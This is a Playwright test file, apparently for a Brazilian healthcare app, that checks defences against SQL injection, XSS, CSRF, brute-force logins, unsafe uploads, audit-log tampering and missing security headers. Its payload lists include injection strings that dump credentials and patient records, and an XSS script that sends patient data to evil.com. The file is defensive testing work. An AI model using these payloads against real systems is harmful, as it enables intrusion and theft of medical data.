/**
 * Healthcare Security Penetration Tests
 *
 * Comprehensive security testing for healthcare data protection,
 * LGPD compliance, and medical information security.
 */

import { expect, test } from "@playwright/test";

interface SQLInjectionPayload {
  name: string;
  payload: string;
  expectedBlocked: boolean;
  severity: "low" | "medium" | "high" | "critical";
}

interface XSSPayload {
  name: string;
  payload: string;
  expectedBlocked: boolean;
  context: "input" | "url" | "header";
}

const SQL_INJECTION_PAYLOADS: SQLInjectionPayload[] = [
  {
    name: "Classic Union Select",
    payload: "' UNION SELECT username, password FROM users--",
    expectedBlocked: true,
    severity: "critical",
  },
  {
    name: "Boolean-based Blind",
    payload: "' OR '1'='1'--",
    expectedBlocked: true,
    severity: "high",
  },
  {
    name: "Time-based Blind",
    payload: "'; WAITFOR DELAY '00:00:05'--",
    expectedBlocked: true,
    severity: "high",
  },
  {
    name: "Error-based",
    payload:
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    expectedBlocked: true,
    severity: "medium",
  },
  {
    name: "Medical Records Access",
    payload: "'; SELECT cpf, medical_history FROM patients WHERE 1=1--",
    expectedBlocked: true,
    severity: "critical",
  },
];

const XSS_PAYLOADS: XSSPayload[] = [
  {
    name: "Basic Script Injection",
    payload: '<script>alert("XSS")</script>',
    expectedBlocked: true,
    context: "input",
  },
  {
    name: "Event Handler Injection",
    payload: '<img src=x onerror=alert("XSS")>',
    expectedBlocked: true,
    context: "input",
  },
  {
    name: "JavaScript Protocol",
    payload: 'javascript:alert("XSS")',
    expectedBlocked: true,
    context: "url",
  },
  {
    name: "Data URI XSS",
    payload: 'data:text/html,<script>alert("XSS")</script>',
    expectedBlocked: true,
    context: "url",
  },
  {
    name: "SVG XSS",
    payload: '<svg onload=alert("XSS")>',
    expectedBlocked: true,
    context: "input",
  },
  {
    name: "Medical Data Theft",
    payload:
      '<script>fetch("/api/patients").then(r=>r.json()).then(d=>fetch("http://evil.com",{method:"POST",body:JSON.stringify(d)}))</script>',
    expectedBlocked: true,
    context: "input",
  },
];

test.describe("Authentication Security Tests", () => {
  test("SQL Injection Protection - Login Form", async ({ page }) => {
    await page.goto("/auth/professional-login");

    for (const payload of SQL_INJECTION_PAYLOADS) {
      await test.step(`Testing ${payload.name} (${payload.severity})`, async () => {
        await page.fill(
          '[data-testid="professional-registration"]',
          payload.payload,
        );
        await page.fill('[data-testid="professional-password"]', "password123");

        const response = page.waitForResponse((res) =>
          res.url().includes("/api/auth/login"),
        );
        await page.click('[data-testid="login-button"]');
        const loginResponse = await response;

        if (payload.expectedBlocked) {
          // Should not allow login or should return error
          expect(loginResponse.status()).not.toBe(200);

          // Should not redirect to dashboard
          await page.waitForTimeout(2000);
          expect(page.url()).not.toContain("/dashboard");

          // Should show security error or remain on login page
          const isOnLoginPage = page.url().includes("/auth/professional-login");
          const hasSecurityError =
            (await page.locator('[data-testid="security-error"]').count()) > 0;

          expect(isOnLoginPage || hasSecurityError).toBe(true);
        }

        // Clear form for next test
        await page.fill('[data-testid="professional-registration"]', "");
        await page.fill('[data-testid="professional-password"]', "");
      });
    }
  });

  test("XSS Protection - Patient Registration", async ({ page }) => {
    await page.goto("/patient/register");

    for (const payload of XSS_PAYLOADS) {
      await test.step(`Testing XSS: ${payload.name}`, async () => {
        if (payload.context === "input") {
          // Test in patient name field
          await page.fill('[data-testid="patient-name"]', payload.payload);

          // Check if script was executed (it shouldn't be)
          let alertTriggered = false;
          page.on("dialog", (dialog) => {
            alertTriggered = true;
            dialog.dismiss();
          });

          await page.waitForTimeout(1000);
          expect(alertTriggered).toBe(false);

          // Check if payload was sanitized in the DOM
          const nameValue = await page.inputValue(
            '[data-testid="patient-name"]',
          );
          if (payload.expectedBlocked) {
            expect(nameValue).not.toContain("<script>");
            expect(nameValue).not.toContain("onerror=");
          }

          await page.fill('[data-testid="patient-name"]', "");
        }
      });
    }
  });

  test("CSRF Protection Validation", async ({ page }) => {
    // First, login normally to get session
    await page.goto("/auth/professional-login");
    await page.fill('[data-testid="professional-registration"]', "123456-SP");
    await page.fill(
      '[data-testid="professional-password"]',
      "ValidPassword123!",
    );
    await page.click('[data-testid="login-button"]');

    // Wait for successful login
    await page.waitForSelector('[data-testid="professional-dashboard"]');

    // Try to make requests without CSRF token
    const response = await page.evaluate(async () => {
      try {
        const res = await fetch("/api/patients", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            name: "Test Patient",
            cpf: "123.456.789-00",
          }),
        });
        return { status: res.status, ok: res.ok };
      } catch (error) {
        return { error: error.message };
      }
    });

    // Should be blocked without proper CSRF token
    expect(response.status).not.toBe(200);
  });

  test("Rate Limiting Protection", async ({ page }) => {
    const attempts = 10;
    const responses = [];

    await page.goto("/auth/professional-login");

    // Make multiple rapid login attempts
    for (let i = 0; i < attempts; i++) {
      await page.fill(
        '[data-testid="professional-registration"]',
        "invalid-user",
      );
      await page.fill('[data-testid="professional-password"]', "invalid-pass");

      const response = page.waitForResponse((res) =>
        res.url().includes("/api/auth/login"),
      );
      await page.click('[data-testid="login-button"]');
      const loginResponse = await response;

      responses.push(loginResponse.status());

      await page.waitForTimeout(100); // Small delay between attempts
    }

    // Should start blocking after several attempts
    const blockedResponses = responses.filter(
      (status) => status === 429 || status === 403,
    );
    expect(blockedResponses.length).toBeGreaterThan(0);

    // Should show rate limit message
    const rateLimitMessage = await page
      .locator('[data-testid="rate-limit-error"]')
      .count();
    expect(rateLimitMessage).toBeGreaterThan(0);
  });

  test("Session Security Validation", async ({ page }) => {
    // Login first
    await page.goto("/auth/professional-login");
    await page.fill('[data-testid="professional-registration"]', "123456-SP");
    await page.fill(
      '[data-testid="professional-password"]',
      "ValidPassword123!",
    );
    await page.click('[data-testid="login-button"]');

    await page.waitForSelector('[data-testid="professional-dashboard"]');

    // Check session cookie security
    const cookies = await page.context().cookies();
    const sessionCookie = cookies.find(
      (cookie) =>
        cookie.name.includes("session") || cookie.name.includes("token"),
    );

    if (sessionCookie) {
      // Session cookie should be secure and httpOnly
      expect(sessionCookie.secure).toBe(true);
      expect(sessionCookie.httpOnly).toBe(true);
      expect(sessionCookie.sameSite).toBe("Strict");
    }

    // Test session timeout
    await page.evaluate(() => {
      // Simulate time passing (in real test, this would be actual timeout)
      localStorage.setItem("test_session_expired", "true");
    });

    // Try to access protected resource after "timeout"
    await page.goto("/patients/sensitive-data");

    // Should redirect to login
    await page.waitForTimeout(2000);
    expect(page.url()).toContain("/auth/");
  });
});

test.describe("Data Protection Security Tests", () => {
  test("Healthcare Data Encryption Validation", async ({ page }) => {
    await page.goto("/api/patients/123");

    // Intercept API response to check data format
    const response = await page.waitForResponse((res) =>
      res.url().includes("/api/patients/123"),
    );
    const data = await response.json();

    // Sensitive fields should be encrypted or not directly exposed
    if (data.cpf) {
      // CPF should be masked or encrypted
      expect(data.cpf).toMatch(/\*\*\*\.\*\*\*\.\*\*\*-\d{2}|\[ENCRYPTED\]/);
    }

    if (data.medicalHistory) {
      // Medical history should be encrypted or require additional auth
      expect(data.medicalHistory).toMatch(/\[ENCRYPTED\]|\[REQUIRES_AUTH\]/);
    }
  });

  test("File Upload Security", async ({ page }) => {
    await page.goto("/patients/123/documents/upload");

    // Test malicious file upload
    const maliciousFiles = [
      { name: "malware.exe", blocked: true },
      { name: "script.js", blocked: true },
      { name: "image.php", blocked: true },
      { name: "document.pdf", blocked: false },
      { name: "xray.jpg", blocked: false },
    ];

    for (const file of maliciousFiles) {
      await test.step(`Testing file upload: ${file.name}`, async () => {
        // Create a test file
        const buffer = Buffer.from("test content");

        await page.setInputFiles('[data-testid="file-upload"]', {
          name: file.name,
          mimeType: file.name.endsWith(".pdf")
            ? "application/pdf"
            : file.name.endsWith(".jpg")
              ? "image/jpeg"
              : "application/octet-stream",
          buffer,
        });

        const response = page.waitForResponse((res) =>
          res.url().includes("/api/upload"),
        );
        await page.click('[data-testid="upload-submit"]');
        const uploadResponse = await response;

        if (file.blocked) {
          expect(uploadResponse.status()).not.toBe(200);

          // Should show security warning
          const securityWarning = await page
            .locator('[data-testid="security-warning"]')
            .count();
          expect(securityWarning).toBeGreaterThan(0);
        } else {
          expect(uploadResponse.status()).toBe(200);
        }
      });
    }
  });

  test("Access Control Validation", async ({ page }) => {
    // Test unauthorized access to patient data
    await page.goto("/api/patients/123/medical-records");

    // Should redirect to login or return 401/403
    const response = await page.waitForResponse((res) =>
      res.url().includes("/api/patients/123/medical-records"),
    );
    expect([401, 403]).toContain(response.status());

    // Test role-based access control
    // Login as nurse
    await page.goto("/auth/professional-login");
    await page.fill('[data-testid="professional-registration"]', "789012-SP");
    await page.fill(
      '[data-testid="professional-password"]',
      "NursePassword123!",
    );
    await page.click('[data-testid="login-button"]');

    // Try to access admin-only functions
    await page.goto("/admin/system-settings");

    // Should be blocked
    await page.waitForTimeout(2000);
    const accessDenied =
      page.url().includes("/access-denied") ||
      page.url().includes("/unauthorized") ||
      (await page.locator('[data-testid="access-denied"]').count()) > 0;

    expect(accessDenied).toBe(true);
  });
});

test.describe("LGPD Compliance Security Tests", () => {
  test("Data Subject Rights Security", async ({ page }) => {
    // Test that data deletion requests are properly secured
    await page.goto("/patients/123/lgpd-rights");

    // Try to delete another patient's data without proper authorization
    const response = await page.evaluate(async () => {
      try {
        const res = await fetch("/api/patients/456/delete-data", {
          method: "DELETE",
          headers: {
            "Content-Type": "application/json",
          },
        });
        return { status: res.status, ok: res.ok };
      } catch (error) {
        return { error: error.message };
      }
    });

    // Should be blocked
    expect(response.status).not.toBe(200);
  });

  test("Consent Management Security", async ({ page }) => {
    await page.goto("/compliance/lgpd-consent");

    // Test that consent cannot be bypassed
    await page.evaluate(() => {
      // Try to manipulate consent in browser
      localStorage.setItem("lgpd_consent", "true");
      sessionStorage.setItem("data_processing_consent", "granted");
    });

    await page.goto("/patients/register");

    // Should still require explicit consent
    const consentRequired =
      (await page.locator('[data-testid="lgpd-consent"]').count()) > 0;
    expect(consentRequired).toBe(true);
  });

  test("Audit Trail Security", async ({ page }) => {
    // Login and perform some actions
    await page.goto("/auth/professional-login");
    await page.fill('[data-testid="professional-registration"]', "123456-SP");
    await page.fill(
      '[data-testid="professional-password"]',
      "ValidPassword123!",
    );
    await page.click('[data-testid="login-button"]');

    await page.waitForSelector('[data-testid="professional-dashboard"]');

    // Access patient data
    await page.goto("/patients/123");

    // Try to manipulate audit logs
    const auditResponse = await page.evaluate(async () => {
      try {
        const res = await fetch("/api/audit-logs/123", {
          method: "DELETE",
        });
        return { status: res.status, ok: res.ok };
      } catch (error) {
        return { error: error.message };
      }
    });

    // Audit logs should not be deletable
    expect(auditResponse.status).not.toBe(200);

    // Try to modify audit logs
    const modifyResponse = await page.evaluate(async () => {
      try {
        const res = await fetch("/api/audit-logs/123", {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            action: "modified_action",
            timestamp: "2025-01-01T00:00:00Z",
          }),
        });
        return { status: res.status, ok: res.ok };
      } catch (error) {
        return { error: error.message };
      }
    });

    // Audit logs should not be modifiable
    expect(modifyResponse.status).not.toBe(200);
  });
});

test.describe("Infrastructure Security Tests", () => {
  test("HTTPS Enforcement", async ({ page }) => {
    // All requests should be HTTPS in production
    const responses: unknown[] = [];

    page.on("response", (response) => {
      responses.push({
        url: response.url(),
        secure: response.url().startsWith("https://"),
      });
    });

    await page.goto("/dashboard/patient");
    await page.waitForLoadState("networkidle");

    // Filter out localhost/development URLs
    const externalResponses = responses.filter(
      (r) =>
        !(
          r.url.includes("localhost") ||
          r.url.includes("127.0.0.1") ||
          r.url.startsWith("data:")
        ),
    );

    for (const response of externalResponses) {
      expect(response.secure).toBe(true);
    }
  });

  test("Security Headers Validation", async ({ page }) => {
    const response = await page.goto("/dashboard/patient");

    const headers = response?.headers() || {};

    // Check critical security headers
    expect(headers["x-frame-options"]).toBeDefined();
    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["x-xss-protection"]).toBeDefined();
    expect(headers["strict-transport-security"]).toBeDefined();
    expect(headers["content-security-policy"]).toBeDefined();

    // Healthcare-specific headers
    expect(headers["referrer-policy"]).toBe("strict-origin-when-cross-origin");
  });

  test("Content Security Policy Validation", async ({ page }) => {
    const response = await page.goto("/dashboard/patient");
    const headers = response?.headers() || {};

    const csp = headers["content-security-policy"];
    expect(csp).toBeDefined();

    if (csp) {
      // Should not allow unsafe-inline or unsafe-eval
      expect(csp).not.toContain("unsafe-inline");
      expect(csp).not.toContain("unsafe-eval");

      // Should have proper default-src
      expect(csp).toContain("default-src");
    }

    // Test that inline scripts are blocked
    let _scriptBlocked = false;
    page.on("console", (msg) => {
      if (msg.text().includes("Content Security Policy")) {
        _scriptBlocked = true;
      }
    });

    await page.evaluate(() => {
      try {
        // This should be blocked by CSP
        eval('// console.log("This should not execute")');
      } catch {}
    });

    await page.waitForTimeout(1000);
    // CSP should block unsafe operations
  });
});
